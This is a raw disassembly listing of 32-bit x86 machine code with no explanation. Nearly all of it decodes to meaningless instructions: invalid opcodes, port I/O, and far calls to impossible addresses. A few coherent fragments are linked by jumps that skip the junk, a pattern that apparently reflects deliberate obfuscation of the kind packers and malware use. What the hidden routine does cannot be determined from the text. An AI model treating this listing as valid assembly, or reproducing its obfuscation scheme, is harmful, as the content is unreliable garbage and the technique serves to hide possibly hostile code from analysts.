  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x254b629c
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403ac6
  403a5b:	sbb    ch,BYTE PTR [ebp+0x1fe9945b]
  403a61:	mov    al,ds:0x3bd48bf
  403a66:	mov    dl,0x49
  403a68:	jo     0x4039f1
  403a6a:	es jp  0x403ab9
  403a6d:	pop    edx
  403a6e:	shl    DWORD PTR ds:0xa28e5eca,1
  403a74:	mov    ds:0xb00b153d,al
  403a79:	add    al,0x61
  403a7b:	sbb    al,0xa5
  403a7d:	xchg   ebp,eax
  403a7e:	push   es
  403a7f:	(bad)  
  403a80:	sti    
  403a81:	jl     0x403a89
  403a83:	fstp   QWORD PTR [ecx-0x46]
  403a86:	mov    ah,BYTE PTR [ebx+0x15b9eef1]
  403a8c:	rol    DWORD PTR [edi+ecx*8+0x41],1
  403a90:	lds    edi,FWORD PTR [edx+0x50]
  403a93:	pop    edi
  403a94:	lods   eax,DWORD PTR ds:[esi]
  403a95:	icebp  
  403a96:	lods   eax,DWORD PTR ds:[esi]
  403a97:	or     eax,0xd55fc2f0
  403a9c:	mov    esp,0x20d6834b
  403aa1:	inc    edx
  403aa2:	scas   al,BYTE PTR es:[edi]
  403aa3:	jle    0x403ac7
  403aa5:	aas    
  403aa6:	mov    WORD PTR [esi+0x50fc3924],gs
  403aac:	xlat   BYTE PTR ds:[ebx]
  403aad:	or     eax,0x8b3ff3f9
  403ab2:	js     0x403b10
  403ab4:	pop    edi
  403ab5:	add    al,0xf5
  403ab7:	add    DWORD PTR [ebp+0x620cc55b],eax
  403abd:	or     bl,cl
  403abf:	ins    DWORD PTR es:[edi],dx
  403ac0:	mov    ds:0xa69779dd,al
  403ac5:	dec    edx
  403ac6:	pop    edi
  403ac7:	iret   
  403ac8:	jb     0x403a7a
  403aca:	fcom   st(2)
  403acc:	call   0x40ea:0x88c452
  403ad3:	mov    ds:0x17f5b715,al
  403ad8:	sub    BYTE PTR [eax],dl
  403ada:	dec    esi
  403adb:	sbb    BYTE PTR [ecx+0x26f5414e],0x34
  403ae2:	sar    BYTE PTR [ebx+ebx*2-0x3a5247fe],0xc1
  403aea:	pushf  
  403aeb:	xor    DWORD PTR [esi-0x13],0x9a7a17e0
  403af2:	sub    eax,eax
  403af4:	std    
  403af5:	adc    eax,0x166cab1c
  403afa:	add    al,BYTE PTR [ebx]
  403afc:	aas    
  403afd:	jle    0x403b38
  403aff:	fs call 0x84f9376b
  403b05:	add    esp,DWORD PTR [ecx-0x1b]
  403b08:	push   ecx
  403b09:	jb     0x403aa4
  403b0b:	sub    eax,0xa70d2e4b
  403b10:	sbb    eax,DWORD PTR [ebx]
  403b12:	cwde   
  403b13:	lods   eax,DWORD PTR ds:[esi]
  403b14:	xchg   esp,eax
  403b15:	push   0x672ef731
  403b1a:	push   cs
  403b1b:	std    
  403b1c:	mov    bl,0x6e
  403b1e:	pop    eax
  403b1f:	or     ah,BYTE PTR [edx+0x57466bb4]
  403b25:	cmp    al,0x2f
  403b27:	push   cs
  403b28:	loope  0x403b9c
  403b2a:	ins    BYTE PTR es:[edi],dx
  403b2b:	cmp    DWORD PTR [esi+0xe],0x6448e996
  403b32:	fcmovnb st,st(1)
  403b34:	out    dx,eax
  403b35:	aaa    
  403b36:	or     eax,0xabe544e9
  403b3b:	inc    ebx
  403b3c:	cmp    DWORD PTR [eax-0x3d],edi
  403b3f:	pop    ds
  403b40:	jnp    0x403b11
  403b42:	neg    DWORD PTR [esi-0x7f]
  403b45:	jbe    0x403b0b
  403b47:	jbe    0x403b7e
  403b49:	sahf   
  403b4a:	nop
  403b4b:	out    dx,eax
  403b4c:	mov    WORD PTR [eax],gs
  403b4e:	dec    esp
  403b4f:	daa    
  403b50:	push   ecx
  403b51:	inc    edi
  403b52:	std    
  403b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b54:	in     eax,dx
  403b55:	retf   0xcf36
  403b58:	sbb    edi,DWORD PTR [edx-0x49e3808b]
  403b5e:	lahf   
  403b5f:	test   al,0x14
  403b61:	push   ecx
  403b62:	inc    esp
  403b63:	xor    ebp,esi
  403b65:	(bad)  
  403b66:	out    0x48,eax
  403b68:	test   DWORD PTR [eax+0x3cc8fcf0],0x777ad239
  403b72:	push   esp
  403b73:	enter  0x6de8,0xe4
  403b77:	push   esi
  403b78:	addr16 test eax,0xcb10ae
  403b7e:	test   BYTE PTR [edi-0x3d408406],bh
  403b84:	out    0x3d,al
  403b86:	dec    edx
  403b87:	mov    esi,0x6bab43f8
  403b8c:	push   esp
  403b8d:	mov    eax,ds:0x27e0fe82
  403b92:	clc    
  403b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b94:	shr    ebp,cl
  403b96:	adc    al,0xe4
  403b98:	test   eax,0xc5ee1487
  403b9d:	icebp  
  403b9e:	xchg   esp,eax
  403b9f:	lds    edx,FWORD PTR [esi]
  403ba1:	sub    ah,dl
  403ba3:	adc    BYTE PTR [edi-0x17629c02],dl
  403ba9:	xchg   ecx,eax
  403baa:	jle    0x403bdb
  403bac:	ins    DWORD PTR es:[edi],dx
  403bad:	mov    ecx,0xc5afa849
  403bb2:	das    
  403bb3:	dec    ebp
  403bb4:	cmp    ch,ch
  403bb6:	es ins BYTE PTR es:[edi],dx
  403bb8:	pop    ebx
  403bb9:	jo     0x403b5b
  403bbb:	jg     0x403c0e
  403bbd:	mov    esp,0xac58775c
  403bc2:	mov    bl,BYTE PTR [edi+0x3]
  403bc5:	pop    es
  403bc6:	enter  0x6d4,0xb0
  403bca:	adc    BYTE PTR [edi+ebp*2-0x4],dh
  403bce:	test   BYTE PTR [esi],ah
  403bd0:	jmp    0x7a95588a
  403bd5:	hlt    
  403bd6:	xchg   esi,eax
  403bd7:	shr    BYTE PTR [edx],1
  403bd9:	shl    BYTE PTR [ecx],cl
  403bdb:	or     bl,BYTE PTR [ecx+ebx*8]
  403bde:	call   0xb97284e8
  403be3:	pop    ebx
  403be4:	dec    esp
  403be5:	jnp    0x403b68
  403be7:	sub    al,0x4c
  403be9:	or     esi,DWORD PTR [ebx+0x31]
  403bec:	xor    ebx,DWORD PTR [eax+0x37b4560b]
  403bf2:	(bad)  
  403bf4:	call   0x72c6fa96
  403bf9:	push   es
  403bfa:	pop    edi
  403bfb:	pushf  
  403bfc:	jae    0x403c27
  403bfe:	mov    esi,0xe1e2f48d
  403c03:	push   edi
  403c04:	xchg   edx,eax
  403c05:	or     dl,BYTE PTR [edx+0x13]
  403c08:	ins    DWORD PTR es:[edi],dx
  403c09:	dec    ebp
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0xe4dcf48b
  403c29:	jp     0x403c3e
  403c2b:	cli    
  403c2c:	inc    edx
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c41
  403c35:	ss std 
  403c37:	nop
  403c38:	rcl    DWORD PTR [edx+0x63],cl
  403c3b:	bound  ecx,QWORD PTR [edx+0x6bf5e603]
  403c41:	mov    cl,0xa0
  403c43:	pop    ebp
  403c44:	(bad)  
  403c45:	frstor [eax-0x38f5e8fe]
  403c4b:	ret    
  403c4c:	xchg   esi,eax
  403c4d:	imul   eax,DWORD PTR [eax+0x4a],0x27d31808
  403c54:	nop
  403c55:	cmp    al,0xb2
  403c57:	imul   edx,ebp,0x1adfc725
  403c5d:	fist   WORD PTR [edx+0x64]
  403c60:	mov    bh,BYTE PTR [edi]
  403c62:	mov    cl,BYTE PTR [ebx+edi*8]
  403c65:	inc    edx
  403c66:	add    eax,0xde302ea4
  403c6b:	retf   
  403c6c:	and    ah,BYTE PTR [ecx+eax*4-0x525d6928]
  403c73:	cld    
  403c74:	gs retf 0xf54
  403c78:	push   ebp
  403c79:	retf   0x30b
  403c7c:	xor    eax,eax
  403c7e:	mov    ebx,0x40eaa865
  403c83:	adc    BYTE PTR [ebp+0x26],ch
  403c86:	and    BYTE PTR [edx-0x38de5e4a],cl
  403c8c:	es jns 0x403c7f
  403c8f:	jo     0x403cda
  403c91:	inc    ebx
  403c92:	adc    esp,edx
  403c94:	std    
  403c95:	xchg   dl,ch
  403c97:	out    0xdd,al
  403c99:	push   edi
  403c9a:	stc    
  403c9b:	adc    edi,ecx
  403c9d:	lods   eax,DWORD PTR ds:[esi]
  403c9e:	lods   al,BYTE PTR es:[esi]
  403ca0:	(bad)  
  403ca1:	adc    cl,BYTE PTR [edx-0x57]
  403ca4:	imul   ebp,ecx,0x2d07d0a2
  403caa:	inc    edi
  403cab:	push   cs
  403cac:	and    edi,DWORD PTR [ebp-0x15ec8cf2]
  403cb2:	test   eax,0x2b25925a
  403cb7:	sbb    edi,eax
  403cb9:	(bad)  
  403cba:	push   ebp
  403cbb:	jno    0x403d31
  403cbd:	inc    eax
  403cbe:	iret   
  403cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cc0:	pop    es
  403cc1:	adc    ecx,DWORD PTR [edi]
  403cc3:	out    dx,eax
  403cc4:	push   ss
  403cc5:	ja     0x403cc7
  403cc7:	cmc    
  403cc8:	mov    ch,0x4d
  403cca:	xchg   ebp,eax
  403ccb:	(bad)  [edx-0x3c]
  403cce:	xchg   ecx,eax
  403ccf:	jp     0x403d0f
  403cd1:	aaa    
  403cd2:	cmc    
  403cd3:	sbb    bl,BYTE PTR [esi]
  403cd5:	jl     0x403c80
  403cd7:	jmp    0x403cce
  403cd9:	scas   al,BYTE PTR es:[edi]
  403cda:	outs   dx,DWORD PTR ds:[esi]
  403cdb:	jae    0x403cf2
  403cdd:	push   ss
  403cde:	adc    BYTE PTR [esi-0x1d],al
  403ce1:	lock mov esp,0x89747c1a
  403ce7:	mov    al,0x85
  403ce9:	mov    ebx,0x11d550a8
  403cee:	lods   al,BYTE PTR ds:[esi]
  403cef:	(bad)  
  403cf0:	dec    ebx
  403cf1:	push   edx
  403cf2:	cmp    DWORD PTR [ebp-0x61d52373],eax
  403cf8:	xchg   BYTE PTR [ebp+0x497be5f1],al
  403cfe:	shr    edx,1
  403d00:	pusha  
  403d01:	fsubr  DWORD PTR fs:[edx+0x1b177e6c]
  403d08:	mov    bh,0xf9
  403d0a:	call   0x3938:0xf6dfaa71
  403d11:	ins    DWORD PTR es:[edi],dx
  403d12:	and    al,0x81
  403d14:	sbb    ebp,DWORD PTR [ebp-0x2ef6c4d9]
  403d1a:	add    bh,bl
  403d1c:	lock pop edi
  403d1e:	pop    edi
  403d1f:	dec    edx
  403d20:	xor    DWORD PTR [edx+0x74],esp
  403d23:	cdq    
  403d24:	push   ebp
  403d25:	xchg   ebp,eax
  403d26:	call   0xcd19:0x156818ac
  403d2d:	icebp  
  403d2e:	loopne 0x403d75
  403d30:	and    DWORD PTR [ebp-0x79],ebp
  403d33:	fnsave [ebx-0x5f7975d6]
  403d39:	or     esi,edi
  403d3b:	mov    bh,0xda
  403d3d:	ja     0x403d96
  403d3f:	sbb    BYTE PTR [ebp-0x78],0x56
  403d43:	add    DWORD PTR [edx],eax
  403d45:	fist   DWORD PTR [eax-0x4b]
  403d48:	dec    eax
  403d49:	jge    0x403dc7
  403d4b:	ror    DWORD PTR [esi],cl
  403d4d:	bound  edx,QWORD PTR [edx+0x43]
  403d50:	enter  0xaecb,0x43
  403d54:	in     eax,0xb8
  403d56:	frndint 
  403d58:	arpl   dx,di
  403d5a:	int3   
  403d5b:	inc    edx
  403d5c:	mov    al,fs:0x2855067a
  403d62:	cs stos BYTE PTR es:[edi],al
  403d64:	push   edx
  403d65:	out    0x88,eax
  403d67:	test   eax,0x263d1a92
  403d6c:	mov    cl,0xf3
  403d6e:	lods   al,BYTE PTR gs:[esi]
  403d70:	sbb    DWORD PTR [eax-0x3c],ebp
  403d73:	fisttp DWORD PTR [edx-0x47]
  403d76:	enter  0xd0b2,0xce
  403d7a:	xor    BYTE PTR [ebx],bl
  403d7c:	cs retf 0x6559
  403d80:	loop   0x403d22
  403d82:	cwde   
  403d83:	and    al,0xa9
  403d85:	aad    0x23
  403d87:	push   ds
  403d88:	push   esp
  403d89:	mov    ds:0xd8d8c5e5,eax
  403d8e:	repnz out 0xb3,eax
  403d91:	xchg   edi,eax
  403d92:	dec    edx
  403d93:	dec    ebx
  403d94:	cmp    BYTE PTR [ecx-0x47],bh
  403d97:	aaa    
  403d98:	sbb    al,0xf8
  403d9a:	jmp    DWORD PTR [eax]
  403d9c:	xchg   ebx,eax
  403d9d:	sbb    edi,esi
  403d9f:	pop    es
  403da0:	sbb    ebx,DWORD PTR [edx-0x79fcfc91]
  403da6:	clc    
  403da7:	repz icebp 
  403da9:	add    BYTE PTR [edi+0x289634b7],bh
  403daf:	in     al,0x2e
  403db1:	mov    bl,0x93
  403db3:	mov    cl,0x3f
  403db5:	scas   eax,DWORD PTR es:[edi]
  403db6:	outs   dx,BYTE PTR ds:[esi]
  403db7:	mov    al,0xfd
  403db9:	dec    ecx
  403dba:	push   ss
  403dbb:	mov    bh,0xd9
  403dbd:	xlat   BYTE PTR ds:[ebx]
  403dbe:	out    0xf4,eax
  403dc0:	mov    al,ss:0x79fac3a3
  403dc6:	scas   al,BYTE PTR es:[edi]
  403dc7:	push   eax
  403dc8:	mov    esp,0xf2093e0
  403dcd:	xor    BYTE PTR [edi+esi*8],bh
  403dd0:	jecxz  0x403e08
  403dd2:	push   edx
  403dd3:	jbe    0x403e11
  403dd5:	jbe    0x403dd9
  403dd7:	jl     0x403d6f
  403dd9:	inc    esp
  403dda:	mov    cl,0xd1
  403ddc:	mov    edi,0x1b13df1d
  403de1:	jae    0x403d8f
  403de3:	scas   eax,DWORD PTR es:[edi]
  403de4:	lea    eax,[ebp-0x18]
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x214684ee],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403dbf
  403e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e12:	pop    ebp
  403e13:	sub    ebp,eax
  403e15:	or     BYTE PTR [esi+0x52],bl
  403e18:	push   edi
  403e19:	aad    0xc
  403e1b:	add    dl,BYTE PTR [esi]
  403e1d:	push   ss
  403e1e:	push   esp
  403e1f:	sbb    cl,bh
  403e21:	mov    gs,WORD PTR [edx-0x47a351f0]
  403e27:	add    eax,edx
  403e29:	xor    edx,ebp
  403e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e2c:	pop    es
  403e2d:	cwde   
  403e2e:	jecxz  0x403e08
  403e30:	mov    dh,0xb7
  403e32:	or     DWORD PTR [ebx-0x3080ff5],ecx
  403e38:	push   eax
  403e39:	fcmove st,st(6)
  403e3b:	cmp    ebx,DWORD PTR [esi+0x2f]
  403e3e:	(bad)  
  403e3f:	daa    
  403e40:	cmp    bh,dh
  403e42:	(bad)  
  403e43:	call   0xcc1ee9d5
  403e48:	cmc    
  403e49:	lea    ebx,[edx-0x34e12775]
  403e4f:	xchg   DWORD PTR [ebx],ebx
  403e51:	cld    
  403e52:	sub    eax,0xce43b02d
  403e57:	add    eax,0x93d548a7
  403e5c:	fisttp QWORD PTR [edi+eiz*1-0x395848ed]
  403e63:	or     eax,DWORD PTR [edi-0x64f89513]
  403e69:	mov    edx,0xa2e6fa7b
  403e6e:	add    DWORD PTR [eax-0x49937527],0x267145f0
  403e78:	mov    al,ds:0xce8e9f64
  403e7d:	sub    ch,BYTE PTR [edx]
  403e7f:	jp     0x403e1a
  403e81:	ss pop edx
  403e83:	push   edx
  403e84:	dec    ebx
  403e85:	dec    ebx
  403e86:	inc    esp
  403e87:	lds    ebp,FWORD PTR [ebx]
  403e89:	inc    ebx
  403e8a:	bound  edx,QWORD PTR [edx-0x75]
  403e8d:	dec    ebx
  403e8e:	jo     0x403eaf
  403e90:	lds    edi,FWORD PTR [ecx]
  403e92:	pop    esi
  403e93:	mov    al,0x53
  403e95:	mov    esp,0x2ef9f6d5
  403e9a:	and    DWORD PTR [esi],ebp
  403e9c:	dec    esp
  403e9d:	jmp    0x4e9d:0xef11e2e1
  403ea4:	xor    esp,DWORD PTR [ebp+0x5ac788e1]
  403eaa:	idiv   DWORD PTR ds:0xe01f809b
  403eb0:	fsub   DWORD PTR [ecx-0x76]
  403eb3:	push   ebx
  403eb4:	loopne 0x403f2d
  403eb6:	xchg   esi,eax
  403eb7:	aad    0x78
  403eb9:	jnp    0x403ebd
  403ebb:	fnstsw WORD PTR [edi*8+0x37050e16]
  403ec2:	fwait
  403ec3:	imul   bl
  403ec5:	or     dh,BYTE PTR [edi+0x2a5ca129]
  403ecb:	mov    cl,0x9d
  403ecd:	pop    ebp
  403ece:	ins    DWORD PTR es:[edi],dx
  403ecf:	mov    edi,0x84dc471f
  403ed4:	pop    edx
  403ed5:	cmp    al,0xf6
  403ed7:	xchg   ebp,eax
  403ed8:	fld    DWORD PTR [edi]
  403eda:	mov    ebx,0xd5c3cb7e
  403edf:	test   al,0x18
  403ee1:	xchg   ebx,eax
  403ee2:	add    dl,0xdb
  403ee5:	sub    DWORD PTR [edx],0xffffffa7
  403ee8:	repz hlt 
  403eea:	inc    DWORD PTR [edx]
  403eec:	pop    ecx
  403eed:	mov    bh,0xed
  403eef:	push   cs
  403ef0:	repnz xor al,0x50
  403ef4:	push   edx
  403ef5:	addr16 pop edx
  403ef7:	sub    ebp,DWORD PTR [ecx-0x8]
  403efa:	popf   
  403efb:	in     al,dx
  403efc:	mov    bl,0x9b
  403efe:	or     eax,0x882dd71e
  403f03:	iret   
  403f04:	jnp    0x403f75
  403f06:	and    esp,DWORD PTR [edi-0x6faeb190]
  403f0c:	push   edx
  403f0d:	fsubr  st,st(6)
  403f0f:	inc    edi
  403f10:	mov    ebx,0xb29ec220
  403f15:	popa   
  403f16:	inc    esp
  403f17:	cld    
  403f18:	sbb    cl,BYTE PTR [eax-0x3e]
  403f1b:	jge    0x403ec7
  403f1d:	lods   eax,DWORD PTR ds:[esi]
  403f1e:	mov    DWORD PTR [esi+0x3c004def],esi
  403f24:	mov    DWORD PTR [esp+ebx*2-0x73],edx
  403f28:	dec    ebx
  403f29:	int    0x3d
  403f2b:	cld    
  403f2c:	sub    BYTE PTR [eax-0x473bd7e5],cl
  403f32:	mov    dh,0xf8
  403f34:	add    edx,ebx
  403f36:	add    eax,DWORD PTR [ebx+edx*4]
  403f39:	iret   
  403f3a:	(bad)  
  403f3b:	lds    ecx,FWORD PTR [eax]
  403f3d:	pushf  
  403f3e:	arpl   si,si
  403f40:	repnz mov BYTE PTR [esp+edi*4],al
  403f44:	mov    ds:0x3412eca8,al
  403f49:	mov    ah,0x66
  403f4b:	stos   DWORD PTR es:[edi],eax
  403f4c:	aad    0xab
  403f4e:	inc    edi
  403f4f:	sbb    ecx,edx
  403f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f52:	retf   0x1ad8
  403f55:	dec    eax
  403f56:	jmp    0x403f9b
  403f58:	push   ds
  403f59:	dec    ebp
  403f5a:	mov    esi,0x75aca848
  403f5f:	dec    edi
  403f60:	out    dx,eax
  403f61:	arpl   WORD PTR [esi-0xf92542a],si
  403f67:	jnp    0x403f17
  403f69:	aam    0x1c
  403f6b:	adc    bl,BYTE PTR [eax-0xcfbbb33]
  403f71:	scas   eax,DWORD PTR es:[edi]
  403f72:	sub    ch,BYTE PTR [ecx+eiz*1]
  403f75:	retf   
  403f76:	cmp    al,BYTE PTR [ebx+eiz*4-0x29]
  403f7a:	fwait
  403f7b:	out    dx,eax
  403f7c:	xchg   esi,eax
  403f7d:	push   0x2d634505
  403f82:	mov    esp,0x7975bd7f
  403f87:	jmp    0xd3f1:0xae028ffc
  403f8e:	xor    cl,ch
  403f90:	add    ebp,esp
  403f92:	imul   BYTE PTR [eax]
  403f94:	iret   
  403f95:	outs   dx,DWORD PTR ds:[esi]
  403f96:	mov    ebp,0xc7ffbcb6
  403f9b:	add    eax,0xbd0d009e
  403fa0:	ret    
  403fa1:	mov    edi,0xe9decc02
  403fa6:	pusha  
  403fa7:	pop    edx
  403fa8:	(bad)  [ebp+0x21f7887c]
  403fae:	(bad)  
  403faf:	sahf   
  403fb0:	jbe    0x403fbc
  403fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb3:	call   0x986602ed
  403fb8:	jmp    0x49c45368
  403fbd:	adc    DWORD PTR [ebx+0x1f],ecx
  403fc0:	mov    eax,DWORD PTR [ebp-0x10]
  403fc3:	mov    edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	(bad)  
  403fda:	pushf  
  403fdb:	cmp    DWORD PTR [ebp+0x22],ecx
  403fde:	sbb    bh,BYTE PTR [esi+0x7e]
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x404010
  403fe6:	push   ss
  403fe7:	test   eax,0x40db9913
  403fec:	cdq    
  403fed:	add    DWORD PTR [ebx],eax
  403fef:	das    
  403ff0:	into   
  403ff1:	test   DWORD PTR [ecx-0x43],0x5dc3e519
  403ff8:	aad    0x9d
  403ffa:	pushf  
  403ffb:	mov    eax,0x4ae53aef
  404000:	xchg   ebx,eax
  404001:	lds    edx,FWORD PTR [ebx-0x1f45359f]
  404007:	xor    DWORD PTR [esi],0x24
  40400a:	pop    edx
  40400b:	sbb    al,0xf7
  40400d:	inc    edi
  40400e:	add    eax,DWORD PTR [edi]
  404010:	push   esi
  404011:	mov    dl,0xd4
  404013:	cmp    BYTE PTR [eax],0xee
  404016:	out    0xd6,al
  404018:	push   cs
  404019:	ret    0x3f72
  40401c:	pushf  
  40401d:	mov    al,0xc
  40401f:	pop    ebp
  404020:	sbb    dl,dl
  404022:	jns    0x404010
  404024:	fsubr  st(0),st
  404026:	fs mov dh,0xf4
  404029:	dec    eax
  40402a:	xor    al,0xc7
  40402c:	jb     0x404099
  40402e:	(bad)  
  404031:	jb     0x403fb9
  404033:	aas    
  404034:	xlat   BYTE PTR ds:[ebx]
  404035:	lods   al,BYTE PTR ds:[esi]
  404036:	mov    ds:0x609adc04,eax
  40403b:	sbb    BYTE PTR [esi],bh
  40403d:	xor    eax,0x5a90b58e
  404042:	push   esi
  404043:	sub    eax,0xd385f8d4
  404048:	add    ebp,DWORD PTR [esi+0x38422478]
  40404e:	mov    eax,ds:0xe2e54cd4
  404053:	mov    bh,0xd1
  404055:	push   cs
  404056:	cmp    BYTE PTR [ecx],ch
  404058:	push   eax
  404059:	or     DWORD PTR [esi-0x5f8c09ae],edi
  40405f:	and    bl,BYTE PTR [eax+ecx*4-0xb]
  404063:	mov    ebp,0x801a7ae5
  404068:	sub    BYTE PTR [ecx+ecx*4],0x62
  40406c:	in     al,dx
  40406d:	sahf   
  40406e:	adc    ah,dl
  404070:	mov    esp,0x5f163f2d
  404075:	fist   WORD PTR [edi]
  404077:	into   
  404078:	sar    DWORD PTR [ebp-0x7f184aa6],1
  40407e:	pop    esi
  40407f:	xchg   esi,eax
  404080:	adc    esp,DWORD PTR [esi+0x51f83c17]
  404086:	jno    0x404009
  404088:	repz push ebx
  40408a:	mov    dl,0x34
  40408c:	data16 out dx,al
  40408e:	pop    es
  40408f:	jo     0x4040b8
  404091:	jns    0x4040ac
  404093:	call   0xe330:0x72a1dd6
  40409a:	add    edx,DWORD PTR [esi+edi*2]
  40409d:	dec    BYTE PTR [ecx]
  40409f:	loop   0x404038
  4040a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a2:	fcomp  DWORD PTR ds:0xb75bd8c4
  4040a8:	and    DWORD PTR [ebp+eax*1+0x47],0xffffffcd
  4040ad:	repz shl DWORD PTR [ebx-0x23],cl
  4040b1:	in     eax,dx
  4040b2:	fisubr DWORD PTR [ecx+0x10620250]
  4040b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040b9:	loop   0x40405c
  4040bb:	outs   dx,DWORD PTR ds:[esi]
  4040bc:	jbe    0x404116
  4040be:	add    DWORD PTR [ecx+0x45],ebp
  4040c1:	(bad)  
  4040c3:	and    bh,0xd9
  4040c6:	test   BYTE PTR [ecx],bl
  4040c8:	idiv   DWORD PTR [ecx+0x3213129c]
  4040ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040cf:	paddd  mm0,QWORD PTR [ebp-0x7bdd8f13]
  4040d6:	jno    0x404094
  4040d8:	retf   
  4040d9:	and    edx,esp
  4040db:	and    esi,DWORD PTR [ebp-0x43]
  4040de:	mov    ecx,0x89dfb837
  4040e3:	call   0x473:0xcf12783a
  4040ea:	hlt    
  4040eb:	out    dx,eax
  4040ec:	adc    al,0x1d
  4040ee:	jae    0x4040dd
  4040f0:	inc    edi
  4040f1:	fiadd  WORD PTR [ebx-0x7e]
  4040f4:	xor    eax,0x1a86cba4
  4040f9:	push   ss
  4040fa:	lock inc ebp
  4040fc:	or     ebx,DWORD PTR ds:0xbb82e0bf
  404102:	pop    ebp
  404103:	jo     0x4040b6
  404105:	mov    BYTE PTR [edx],al
  404107:	dec    ebx
  404108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404109:	aas    
  40410a:	fcomp  DWORD PTR [edx]
  40410c:	call   0xe1056ee2
  404111:	not    BYTE PTR [eax+0x25]
  404114:	cli    
  404115:	pusha  
  404116:	pushaw 
  404118:	mov    bl,0xeb
  40411a:	out    dx,al
  40411b:	repnz push esp
  40411d:	sbb    BYTE PTR [ebx-0x54],ch
  404120:	jne    0x404106
  404122:	test   BYTE PTR [eax+0x32],al
  404125:	or     eax,0xf1be5330
  40412a:	repnz das 
  40412c:	dec    eax
  40412d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40412e:	ins    DWORD PTR es:[edi],dx
  40412f:	xchg   ebx,eax
  404130:	push   ss
  404131:	push   edx
  404132:	and    bl,BYTE PTR [eax]
  404134:	pop    ebx
  404135:	xor    ch,BYTE PTR [eax]
  404137:	mov    BYTE PTR [ebx+0x71],cl
  40413a:	xor    BYTE PTR [ecx+0x70],ch
  40413d:	inc    edi
  40413e:	jne    0x4040f6
  404140:	jb     0x40411f
  404142:	aad    0x3
  404144:	outs   dx,DWORD PTR ds:[esi]
  404145:	jp     0x4040e5
  404147:	ins    DWORD PTR es:[edi],dx
  404148:	dec    ecx
  404149:	imul   ebx,DWORD PTR [esi],0x65bdc7bc
  40414f:	inc    ebx
  404150:	test   DWORD PTR ss:[edi+0x74],edx
  404154:	out    dx,al
  404155:	lock mov dh,0xd8
  404158:	xor    DWORD PTR [ebx],edi
  40415a:	lock sub al,0xd4
  40415d:	mov    ch,0x69
  40415f:	mov    ebp,0x925f4be0
  404164:	out    0x7d,eax
  404166:	lds    esp,FWORD PTR [edx]
  404168:	sbb    esi,eax
  40416a:	xchg   ebx,eax
  40416b:	cmp    eax,0x25cd1644
  404170:	dec    ebp
  404171:	mov    edx,0x9889e510
  404176:	mov    BYTE PTR [ebp-0x41],dh
  404179:	sub    al,0xa3
  40417b:	aad    0xc8
  40417d:	dec    edx
  40417e:	out    0xb,eax
  404180:	mov    edx,0x5da3314
  404185:	sub    ch,BYTE PTR [ecx+0x61]
  404188:	cld    
  404189:	repz pop ss
  40418b:	aaa    
  40418c:	clc    
  40418d:	mov    ?,WORD PTR [edi-0x3447017b]
  404193:	pop    edx
  404194:	into   
  404195:	lea    eax,[eax+edx*1+0x32729b]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	cwde   
  4041d6:	ins    DWORD PTR es:[edi],dx
  4041d7:	cld    
  4041d8:	push   esi
  4041d9:	push   edx
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041ee
  4041e2:	push   0xc2df7941
  4041e7:	xchg   ecx,eax
  4041e8:	in     al,dx
